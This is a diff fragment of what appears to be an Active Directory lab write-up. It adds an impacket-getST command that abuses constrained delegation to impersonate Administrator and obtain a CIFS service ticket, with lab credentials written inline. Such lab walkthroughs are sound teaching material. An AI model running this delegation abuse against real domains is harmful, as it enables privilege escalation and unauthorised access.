@@ -50,8 +50,12 @@ We can dump the LDAP and import it in BloodHound, we can see a `AllowToDelegate`
 This allows us to impersonate certain Service Account, such as the Administrator and get the Service Tickets.
 
 ```bash
-  
+ impacket-getST -spn 'CIFS/winterfell.north.sevenkingdoms.local' \
+  -impersonate 'Administrator' \
+  'north.sevenkingdoms.local/jon.snow:iknownothing' 
 ```
+
+And with this we retreive the ST of the Administrator.
 
 
   
